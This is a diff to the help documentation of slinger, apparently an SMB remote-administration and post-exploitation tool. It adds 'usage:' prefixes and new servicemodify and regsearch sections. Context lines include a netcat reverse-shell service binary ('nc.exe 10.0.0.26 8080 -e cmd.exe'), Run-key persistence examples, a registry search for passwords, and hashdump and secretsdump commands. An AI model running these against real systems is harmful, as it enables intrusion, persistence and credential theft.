@@ -6,7 +6,7 @@
 
 **Help:**
 ```
-use [-h] share
+usage: use [-h] share
 Connect to a specific share on the remote server
 ```
 
@@ -28,7 +28,7 @@ Example Usage: use <sharename> | use C$
 
 **Help:**
 ```
-ls [-h] [-s {name,size,created,lastaccess,lastwrite}]
+usage: ls [-h] [-s {name,size,created,lastaccess,lastwrite}]
                   [--sort-reverse] [-l] [-r depth] [-o filename] [--show]
                   [--type {f,d,a}]
                   [path]
@@ -73,7 +73,7 @@ ls --type f -r 2        # Recursively list only files to depth 2
 
 **Help:**
 ```
-find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE]
+usage: find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE]
                     [--mtime MTIME] [--ctime CTIME] [--atime ATIME] [--regex]
                     [--iname] [--maxdepth MAXDEPTH] [--mindepth MINDEPTH]
                     [--limit LIMIT] [--sort {name,size,mtime,ctime,atime}]
@@ -150,7 +150,7 @@ Example Usage: find "*.txt" -path /Users -type f -size +1MB
 
 **Help:**
 ```
-shares [-h] [-l]
+usage: shares [-h] [-l]
 List all shares available on the remote server
 ```
 
@@ -167,7 +167,7 @@ Example Usage: shares
 
 **Help:**
 ```
-shares [-h] [-l]
+usage: shares [-h] [-l]
 List all shares available on the remote server
 ```
 
@@ -184,7 +184,7 @@ Example Usage: shares
 
 **Help:**
 ```
-enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}]
+usage: enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}]
                          [--output filename]
 Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.
 ```
@@ -212,7 +212,7 @@ Example Usage: enumpipes --detailed --output pipes.txt
 
 **Help:**
 ```
-cat [-h] remote_path
+usage: cat [-h] remote_path
 Display the contents of a specified file on the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -234,7 +234,7 @@ Example Usage: cat /path/to/file
 
 **Help:**
 ```
-cd [-h] [path]
+usage: cd [-h] [path]
 Change to a different directory on the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -257,7 +257,7 @@ Example Usage: cd /path/to/directory
 
 **Help:**
 ```
-pwd [-h]
+usage: pwd [-h]
 Print the current working directory on the remote server
 ```
 
@@ -274,7 +274,7 @@ Example Usage: pwd
 
 **Help:**
 ```
-exit [-h]
+usage: exit [-h]
 Exit the application
 ```
 
@@ -291,7 +291,7 @@ Example Usage: exit
 
 **Help:**
 ```
-exit [-h]
+usage: exit [-h]
 Exit the application
 ```
 
@@ -308,7 +308,7 @@ Example Usage: exit
 
 **Help:**
 ```
-exit [-h]
+usage: exit [-h]
 Exit the application
 ```
 
@@ -325,7 +325,7 @@ Example Usage: exit
 
 **Help:**
 ```
-exit [-h]
+usage: exit [-h]
 Exit the application
 ```
 
@@ -342,7 +342,7 @@ Example Usage: exit
 
 **Help:**
 ```
-clear [-h]
+usage: clear [-h]
 Clear the screen
 ```
 
@@ -359,7 +359,7 @@ Example Usage: clear
 
 **Help:**
 ```
-help [-h] [--verbose] [cmd]
+usage: help [-h] [--verbose] [cmd]
 Display help information for the application
 ```
 
@@ -381,7 +381,7 @@ Example Usage: help
 
 **Help:**
 ```
-reconnect [-h]
+usage: reconnect [-h]
 Reconnect to the server to fix broken pipe or connection errors
 ```
 
@@ -398,7 +398,7 @@ Use this command when you encounter '[Errno 32] Broken pipe' errors
 
 **Help:**
 ```
-who [-h]
+usage: who [-h]
 List the current sessions connected to the target host
 ```
 
@@ -415,7 +415,7 @@ Example Usage: who
 
 **Help:**
 ```
-enumdisk [-h]
+usage: enumdisk [-h]
 Enumerate server disk information
 ```
 
@@ -432,7 +432,7 @@ Example Usage: enumdisk
 
 **Help:**
 ```
-enumlogons [-h]
+usage: enumlogons [-h]
 Enumerate users currently logged on the server
 ```
 
@@ -449,7 +449,7 @@ Example Usage: enumlogons
 
 **Help:**
 ```
-enuminfo [-h]
+usage: enuminfo [-h]
 Enumerate detailed information about the remote host
 ```
 
@@ -466,7 +466,7 @@ Example Usage: enuminfo
 
 **Help:**
 ```
-enumsys [-h]
+usage: enumsys [-h]
 Enumerate system information of the remote host
 ```
 
@@ -483,7 +483,7 @@ Example Usage: enumsys
 
 **Help:**
 ```
-enumtransport [-h]
+usage: enumtransport [-h]
 Enumerate transport information of the remote host
 ```
 
@@ -500,7 +500,7 @@ Example Usage: enumtransport
 
 **Help:**
 ```
-enumservices [-h] [-n] [--filter FILTER]
+usage: enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
 ```
 
@@ -522,7 +522,7 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-enumservices [-h] [-n] [--filter FILTER]
+usage: enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
 ```
 
@@ -544,7 +544,7 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-enumservices [-h] [-n] [--filter FILTER]
+usage: enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
 ```
 
@@ -566,7 +566,7 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-enumservices [-h] [-n] [--filter FILTER]
+usage: enumservices [-h] [-n] [--filter FILTER]
 Enumerate services on the remote host
 ```
 
@@ -588,7 +588,7 @@ Example Usage: enumservices --filter name=spooler OR enumservices --filter state
 
 **Help:**
 ```
-serviceshow [-h] (-i SERVICEID | service_name)
+usage: serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
 ```
 
@@ -613,7 +613,7 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-serviceshow [-h] (-i SERVICEID | service_name)
+usage: serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
 ```
 
@@ -638,7 +638,7 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-serviceshow [-h] (-i SERVICEID | service_name)
+usage: serviceshow [-h] (-i SERVICEID | service_name)
 Show details of a specific service on the remote server
 ```
 
@@ -663,7 +663,7 @@ Example Usage: serviceshow -i 123
 
 **Help:**
 ```
-servicestart [-h] (-i SERVICEID | service_name)
+usage: servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
 ```
 
@@ -688,7 +688,7 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-servicestart [-h] (-i SERVICEID | service_name)
+usage: servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
 ```
 
@@ -713,7 +713,7 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-servicestart [-h] (-i SERVICEID | service_name)
+usage: servicestart [-h] (-i SERVICEID | service_name)
 Start a specified service on the remote server
 ```
 
@@ -738,7 +738,7 @@ Example Usage: servicestart -i 123  OR svcstart Spooler
 
 **Help:**
 ```
-servicestop [-h] (-i SERVICEID | service_name)
+usage: servicestop [-h] (-i SERVICEID | service_name)
 Stop a specified service on the remote server
 ```
 
@@ -763,7 +763,7 @@ Example Usage: servicestop -i 123  OR svcstop Spooler
 
 **Help:**
 ```
-servicestop [-h] (-i SERVICEID | service_name)
+usage: servicestop [-h] (-i SERVICEID | service_name)
 Stop a specified service on the remote server
 ```
 
@@ -788,7 +788,7 @@ Example Usage: servicestop -i 123  OR svcstop Spooler
 
 **Help:**
 ```
-serviceenable [-h] (-i SERVICEID | service_name)
+usage: serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
 ```
 
@@ -813,7 +813,7 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-serviceenable [-h] (-i SERVICEID | service_name)
+usage: serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
 ```
 
@@ -838,7 +838,7 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-serviceenable [-h] (-i SERVICEID | service_name)
+usage: serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
 ```
 
@@ -863,7 +863,7 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-serviceenable [-h] (-i SERVICEID | service_name)
+usage: serviceenable [-h] (-i SERVICEID | service_name)
 Enable a specified service on the remote server
 ```
 
@@ -888,7 +888,7 @@ Example Usage: serviceenable -i 123  OR svcenable Spooler
 
 **Help:**
 ```
-servicedisable [-h] (-i SERVICEID | service_name)
+usage: servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
 ```
 
@@ -913,7 +913,7 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-servicedisable [-h] (-i SERVICEID | service_name)
+usage: servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
 ```
 
@@ -938,7 +938,7 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-servicedisable [-h] (-i SERVICEID | service_name)
+usage: servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
 ```
 
@@ -963,7 +963,7 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-servicedisable [-h] (-i SERVICEID | service_name)
+usage: servicedisable [-h] (-i SERVICEID | service_name)
 Disable a specified service on the remote server
 ```
 
@@ -988,7 +988,7 @@ Example Usage: servicedisable -i 123  OR svcdisable Spooler
 
 **Help:**
 ```
-servicedel [-h] (-i SERVICEID | service_name)
+usage: servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
 ```
 
@@ -1013,7 +1013,7 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-servicedel [-h] (-i SERVICEID | service_name)
+usage: servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
 ```
 
@@ -1038,7 +1038,7 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-servicedel [-h] (-i SERVICEID | service_name)
+usage: servicedel [-h] (-i SERVICEID | service_name)
 Delete a specified service on the remote server
 ```
 
@@ -1063,7 +1063,7 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
                           -s {auto,demand,system}
 Create a new service on the remote server
 ```
@@ -1097,7 +1097,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
                           -s {auto,demand,system}
 Create a new service on the remote server
 ```
@@ -1131,7 +1131,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
                           -s {auto,demand,system}
 Create a new service on the remote server
 ```
@@ -1165,7 +1165,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
+usage: serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
                           -s {auto,demand,system}
 Create a new service on the remote server
 ```
@@ -1193,13 +1193,160 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 ---
 
+## `servicemodify`
+
+**Description:** Modify service binary path, display name, start type, or account
+
+**Help:**
+```
+usage: servicemodify [-h] [--binary-path BINARY_PATH]
+                             [--display-name DISPLAY_NAME]
+                             [--start-type {auto,demand,disabled,system}]
+                             [--account ACCOUNT] [--password PASSWORD]
+                             [-i SERVICEID | service_name]
+Modify service binary path, display name, start type, or account
+```
+
+**Example Usage:**
+```
+Examples:
+  servicemodify Spooler --start-type demand
+  servicemodify Spooler --binary-path "C:\\new\\path.exe" --display-name "New Name"
+  servicemodify -i 5 --account "NT AUTHORITY\\LocalService"
+
+```
+
+### Arguments
+
+- **`serviceid`**: Specify the service ID
+  - Required: No
+
+- **`service_name`**: Specify the service name
+  - Required: No
+
+- **`binary_path`**: New binary path for the service
+  - Required: No
+
+- **`display_name`**: New display name for the service
+  - Required: No
+
+- **`start_type`**: New start type for the service
+  - Choices: auto, demand, disabled, system
+  - Required: No
+
+- **`account`**: Account the service runs as on startup (e.g., LocalSystem, NT AUTHORITY\\NetworkService, DOMAIN\\user)
+  - Required: No
+
+- **`password`**: Password for --account (required for domain/local users, not needed for built-in accounts like LocalSystem)
+  - Required: No
+
+---
+
+## `svcmodify`
+
+**Description:** Modify service binary path, display name, start type, or account
+
+**Help:**
+```
+usage: servicemodify [-h] [--binary-path BINARY_PATH]
+                             [--display-name DISPLAY_NAME]
+                             [--start-type {auto,demand,disabled,system}]
+                             [--account ACCOUNT] [--password PASSWORD]
+                             [-i SERVICEID | service_name]
+Modify service binary path, display name, start type, or account
+```
+
+**Example Usage:**
+```
+Examples:
+  servicemodify Spooler --start-type demand
+  servicemodify Spooler --binary-path "C:\\new\\path.exe" --display-name "New Name"
+  servicemodify -i 5 --account "NT AUTHORITY\\LocalService"
+
+```
+
+### Arguments
+
+- **`serviceid`**: Specify the service ID
+  - Required: No
+
+- **`service_name`**: Specify the service name
+  - Required: No
+
+- **`binary_path`**: New binary path for the service
+  - Required: No
+
+- **`display_name`**: New display name for the service
+  - Required: No
+
+- **`start_type`**: New start type for the service
+  - Choices: auto, demand, disabled, system
+  - Required: No
+
+- **`account`**: Account the service runs as on startup (e.g., LocalSystem, NT AUTHORITY\\NetworkService, DOMAIN\\user)
+  - Required: No
+
+- **`password`**: Password for --account (required for domain/local users, not needed for built-in accounts like LocalSystem)
+  - Required: No
+
+---
+
+## `modifyservice`
+
+**Description:** Modify service binary path, display name, start type, or account
+
+**Help:**
+```
+usage: servicemodify [-h] [--binary-path BINARY_PATH]
+                             [--display-name DISPLAY_NAME]
+                             [--start-type {auto,demand,disabled,system}]
+                             [--account ACCOUNT] [--password PASSWORD]
+                             [-i SERVICEID | service_name]
+Modify service binary path, display name, start type, or account
+```
+
+**Example Usage:**
+```
+Examples:
+  servicemodify Spooler --start-type demand
+  servicemodify Spooler --binary-path "C:\\new\\path.exe" --display-name "New Name"
+  servicemodify -i 5 --account "NT AUTHORITY\\LocalService"
+
+```
+
+### Arguments
+
+- **`serviceid`**: Specify the service ID
+  - Required: No
+
+- **`service_name`**: Specify the service name
+  - Required: No
+
+- **`binary_path`**: New binary path for the service
+  - Required: No
+
+- **`display_name`**: New display name for the service
+  - Required: No
+
+- **`start_type`**: New start type for the service
+  - Choices: auto, demand, disabled, system
+  - Required: No
+
+- **`account`**: Account the service runs as on startup (e.g., LocalSystem, NT AUTHORITY\\NetworkService, DOMAIN\\user)
+  - Required: No
+
+- **`password`**: Password for --account (required for domain/local users, not needed for built-in accounts like LocalSystem)
+  - Required: No
+
+---
+
 ## `enumtasks`
 
 **Description:** Enumerate scheduled tasks on the remote server
 
 **Help:**
 ```
-enumtasks [-h] [-n] [--filter FILTER]
+usage: enumtasks [-h] [-n] [--filter FILTER]
 Enumerate scheduled tasks on the remote server
 ```
 
@@ -1221,7 +1368,7 @@ Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Wi
 
 **Help:**
 ```
-enumtasks [-h] [-n] [--filter FILTER]
+usage: enumtasks [-h] [-n] [--filter FILTER]
 Enumerate scheduled tasks on the remote server
 ```
 
@@ -1243,7 +1390,7 @@ Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Wi
 
 **Help:**
 ```
-enumtasks [-h] [-n] [--filter FILTER]
+usage: enumtasks [-h] [-n] [--filter FILTER]
 Enumerate scheduled tasks on the remote server
 ```
 
@@ -1265,7 +1412,7 @@ Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Wi
 
 **Help:**
 ```
-taskshow [-h] (-i TASK_ID | task_path)
+usage: taskshow [-h] (-i TASK_ID | task_path)
 Show details of a specific task on the remote server
 ```
 
@@ -1290,7 +1437,7 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-taskshow [-h] (-i TASK_ID | task_path)
+usage: taskshow [-h] (-i TASK_ID | task_path)
 Show details of a specific task on the remote server
 ```
 
@@ -1315,7 +1462,7 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-taskshow [-h] (-i TASK_ID | task_path)
+usage: taskshow [-h] (-i TASK_ID | task_path)
 Show details of a specific task on the remote server
 ```
 
@@ -1340,7 +1487,7 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
+usage: taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
                           [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
@@ -1379,7 +1526,7 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
+usage: taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
                           [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
@@ -1418,7 +1565,7 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-taskimport [-h] -f FILE [-n NAME] [-d FOLDER] [--test]
+usage: taskimport [-h] -f FILE [-n NAME] [-d FOLDER] [--test]
                           [--force]
 Import a scheduled task from a local XML definition file
 ```
@@ -1448,7 +1595,7 @@ Example Usage: taskimport -f task.xml --test | taskimport -f task.xml -n MyTask 
 
 **Help:**
 ```
-taskrun [-h] task_path
+usage: taskrun [-h] task_path
 Run a specified task on the remote server
 ```
 
@@ -1470,7 +1617,7 @@ Example Usage: taskrun \\Windows\\newtask
 
 **Help:**
 ```
-taskrun [-h] task_path
+usage: taskrun [-h] task_path
 Run a specified task on the remote server
 ```
 
@@ -1492,7 +1639,7 @@ Example Usage: taskrun \\Windows\\newtask
 
 **Help:**
 ```
-taskdelete [-h] (-i TASK_ID | task_path)
+usage: taskdelete [-h] (-i TASK_ID | task_path)
 Delete a specified task on the remote server
 ```
 
@@ -1517,7 +1664,7 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-taskdelete [-h] (-i TASK_ID | task_path)
+usage: taskdelete [-h] (-i TASK_ID | task_path)
 Delete a specified task on the remote server
 ```
 
@@ -1542,7 +1689,7 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-taskdelete [-h] (-i TASK_ID | task_path)
+usage: taskdelete [-h] (-i TASK_ID | task_path)
 Delete a specified task on the remote server
 ```
 
@@ -1567,7 +1714,7 @@ Example Usage: taskdelete -i 123
 
 **Help:**
 ```
-time [-h]
+usage: time [-h]
 Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
 ```
 
@@ -1584,7 +1731,7 @@ Example Usage: time
 
 **Help:**
 ```
-time [-h]
+usage: time [-h]
 Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
 ```
 
@@ -1601,7 +1748,7 @@ Example Usage: time
 
 **Help:**
 ```
-time [-h]
+usage: time [-h]
 Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
 ```
 
@@ -1618,7 +1765,7 @@ Example Usage: time
 
 **Help:**
 ```
-upload [-h] local_path [remote_path]
+usage: upload [-h] local_path [remote_path]
 Upload a file to the remote server
 ```
 
@@ -1643,7 +1790,7 @@ Example Usage: upload /local/path /remote/path
 
 **Help:**
 ```
-upload [-h] local_path [remote_path]
+usage: upload [-h] local_path [remote_path]
 Upload a file to the remote server
 ```
 
@@ -1668,7 +1815,7 @@ Example Usage: upload /local/path /remote/path
 
 **Help:**
 ```
-download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
+usage: download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
                         remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
@@ -1698,7 +1845,7 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 
 **Help:**
 ```
-download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
+usage: download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
                         remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
@@ -1728,7 +1875,7 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 
 **Help:**
 ```
-mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]
+usage: mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]
 Download all files from a specified directory and its subdirectories. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1760,7 +1907,7 @@ Example Usage: mget /remote/path /local/path
 
 **Help:**
 ```
-mkdir [-h] path
+usage: mkdir [-h] path
 Create a new directory on the remote server
 ```
 
@@ -1782,7 +1929,7 @@ Example Usage: mkdir /path/to/new/directory
 
 **Help:**
 ```
-rmdir [-h] remote_path
+usage: rmdir [-h] remote_path
 Remove a directory on the remote server
 ```
 
@@ -1804,7 +1951,7 @@ Example Usage: rmdir /path/to/remote/directory
 
 **Help:**
 ```
-rm [-h] [-n FILE_LIST] [remote_path]
+usage: rm [-h] [-n FILE_LIST] [remote_path]
 Delete one or more files on the remote server
 ```
 
@@ -1829,7 +1976,7 @@ Example Usage: rm file.txt, rm -n 'file1.txt file2.txt file3.txt'
 
 **Help:**
 ```
-#shell [-h]
+usage: #shell [-h]
 Enter local terminal mode for command execution
 ```
 
@@ -1846,7 +1993,7 @@ Example Usage: #shell
 
 **Help:**
 ```
-! [-h] ...
+usage: ! [-h] ...
 Run a specified local command
 ```
 
@@ -1868,7 +2015,7 @@ Example Usage: ! ls -l
 
 **Help:**
 ```
-info [-h]
+usage: info [-h]
 Display the status of the current session
 ```
 
@@ -1885,7 +2032,7 @@ Example Usage: info
 
 **Help:**
 ```
-history [-h] [-n NUM]
+usage: history [-h] [-n NUM]
 Display recent command history from the slinger history file
 ```
 
@@ -1908,7 +2055,7 @@ Example Usage: history, history -n 20
 
 **Help:**
 ```
-reguse [-h]
+usage: reguse [-h]
 Connect to a remote registry on the remote server
 ```
 
@@ -1925,7 +2072,7 @@ Example Usage: reguse
 
 **Help:**
 ```
-reguse [-h]
+usage: reguse [-h]
 Connect to a remote registry on the remote server
 ```
 
@@ -1942,7 +2089,7 @@ Example Usage: reguse
 
 **Help:**
 ```
-regstop [-h]
+usage: regstop [-h]
 Disconnect from a remote registry on the remote server
 ```
 
@@ -1959,7 +2106,7 @@ Example Usage: regstop
 
 **Help:**
 ```
-regquery [-h] [-l] [-v] key
+usage: regquery [-h] [-l] [-v] key
 Query a registry key on the remote server
 ```
 
@@ -1981,7 +2128,7 @@ Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 
 
 **Help:**
 ```
-regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]
+usage: regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]
 Set a registry value on the remote server
 ```
 
@@ -2013,7 +2160,7 @@ Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 
 **Help:**
 ```
-regdel [-h] -k KEY [-v VALUE]
+usage: regdel [-h] -k KEY [-v VALUE]
 Delete a registry value on the remote server
 ```
 
@@ -2038,7 +2185,7 @@ Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 
 **Help:**
 ```
-regcreate [-h] key
+usage: regcreate [-h] key
 Create a registry key on the remote server
 ```
 
@@ -2060,7 +2207,7 @@ Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\
 
 **Help:**
 ```
-regcheck [-h] key
+usage: regcheck [-h] key
 Check if a registry key exists on the remote server. This is really just an exposed helper function.
 ```
 
@@ -2076,13 +2223,58 @@ Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\
 
 ---
 
+## `regsearch`
+
+**Description:** Recursively search registry for keys and values matching a pattern
+
+**Help:**
+```
+usage: regsearch [-h] [-k KEY] [--maxdepth MAXDEPTH] [--values]
+                         [--limit LIMIT] [--format {table,json}]
+                         pattern
+Recursively search registry for keys and values matching a pattern
+```
+
+**Example Usage:**
+```
+Examples:
+  regsearch "Python" -k "HKLM\SOFTWARE"
+  regsearch "Spooler" -k "HKLM\SYSTEM\CurrentControlSet\Services" --values
+  regsearch "Run" -k "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" --maxdepth 3
+  regsearch "password" -k "HKLM\SOFTWARE" --values --format json
+```
+
+### Arguments
+
+- **`pattern`**: Search pattern (case-insensitive substring match)
+  - Required: Yes
+
+- **`key`**: Root key to search from
+  - Default: `HKLM\SOFTWARE`
+  - Required: No
+
+- **`maxdepth`**: Maximum recursion depth
+  - Default: `5`
+  - Required: No
+
+- **`limit`**: Maximum results to return
+  - Default: `100`
+  - Required: No
+
+- **`format`**: Output format
+  - Choices: table, json
+  - Default: `table`
+  - Required: No
+
+---
+
 ## `portfwd`
 
 **Description:** Forward a local port to a remote port on the remote server
 
 **Help:**
 ```
-portfwd [-h] (-d | -a | -l | -c | --load) local remote
+usage: portfwd [-h] (-d | -a | -l | -c | --load) local remote
 Forward a local port to a remote port on the remote server
 ```
 
@@ -2107,7 +2299,7 @@ Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
 
 **Help:**
 ```
-ifconfig [-h]
+usage: ifconfig [-h]
 Display network interfaces on the remote server
 ```
 
@@ -2124,7 +2316,7 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-ifconfig [-h]
+usage: ifconfig [-h]
 Display network interfaces on the remote server
 ```
 
@@ -2141,7 +2333,7 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-ifconfig [-h]
+usage: ifconfig [-h]
 Display network interfaces on the remote server
 ```
 
@@ -2158,7 +2350,7 @@ Example Usage: ifconfig
 
 **Help:**
 ```
-hostname [-h]
+usage: hostname [-h]
 Display the hostname of the remote server
 ```
 
@@ -2175,7 +2367,7 @@ Example Usage: hostname
 
 **Help:**
 ```
-procs [-h] [-v] [-t]
+usage: procs [-h] [-v] [-t]
 List running processes on the remote server
 ```
 
@@ -2192,7 +2384,7 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-procs [-h] [-v] [-t]
+usage: procs [-h] [-v] [-t]
 List running processes on the remote server
 ```
 
@@ -2209,7 +2401,7 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-procs [-h] [-v] [-t]
+usage: procs [-h] [-v] [-t]
 List running processes on the remote server
 ```
 
@@ -2226,7 +2418,7 @@ Example Usage: procs -t -v
 
 **Help:**
 ```
-fwrules [-h]
+usage: fwrules [-h]
 Display firewall rules on the remote server
 ```
 
@@ -2243,7 +2435,7 @@ Example Usage: fwrules
 
 **Help:**
 ```
-set [-h] varname [value]
+usage: set [-h] varname [value]
 Set a variable for use in the application
 ```
 
@@ -2269,7 +2461,7 @@ Example Usage: set varname value
 
 **Help:**
 ```
-config [-h]
+usage: config [-h]
 Show the current config
 ```
 
@@ -2286,7 +2478,7 @@ Example Usage: config
 
 **Help:**
 ```
-run [-h] (-c CMD_CHAIN | -f FILE)
+usage: run [-h] (-c CMD_CHAIN | -f FILE)
 Run a slinger script or command sequence
 ```
 
@@ -2311,7 +2503,7 @@ Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"
 
 **Help:**
 ```
-hashdump [-h]
+usage: hashdump [-h]
 Dump hashes from the remote server
 ```
 
@@ -2328,7 +2520,7 @@ Example Usage: hashdump
 
 **Help:**
 ```
-secretsdump [-h]
+usage: secretsdump [-h]
 Dump secrets from the remote server
 ```
 
@@ -2345,7 +2537,7 @@ Example Usage: secretsdump
 
 **Help:**
 ```
-env [-h]
+usage: env [-h]
 Display environment variables on the remote server
 ```
 
@@ -2362,7 +2554,7 @@ Example Usage: env
 
 **Help:**
 ```
-debug-availcounters [-h] [-f FILTER] [-p] [-s filename]
+usage: debug-availcounters [-h] [-f FILTER] [-p] [-s filename]
 Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.
 ```
 
@@ -2387,7 +2579,7 @@ Example Usage: availcounters
 
 **Help:**
 ```
-debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]
+usage: debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]
 Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.
 ```
 
@@ -2414,7 +2606,7 @@ Example Usage: counter -c 123 [-a x86]
 
 **Help:**
 ```
-network [-h] [--tcp] [--rdp]
+usage: network [-h] [--tcp] [--rdp]
 Display network information on the remote server
 ```
 
@@ -2431,8 +2623,9 @@ Example Usage: network
 
 **Help:**
 ```
-atexec [-h] -c COMMAND [--sp SP] [--sn SN] [--tn TN] [--ta TA]
-                      [--td TD] [--tf TF] [--sh SH] [-i] [-w WAIT]
+usage: atexec [-h] -c COMMAND [--sp SP] [--sn SN] [--tn TN] [--ta TA]
+                      [--td TD] [--tf TF] [--sh SH] [--no-output] [-i]
+                      [-w WAIT]
 Execute a command on the remote server
 ```
 
@@ -2485,7 +2678,7 @@ For multi-word commands: atexec -c "echo hello world" -tn MyTask
 
 **Help:**
 ```
-reload [-h]
+usage: reload [-h]
 Reload the current sessions context
 ```
 
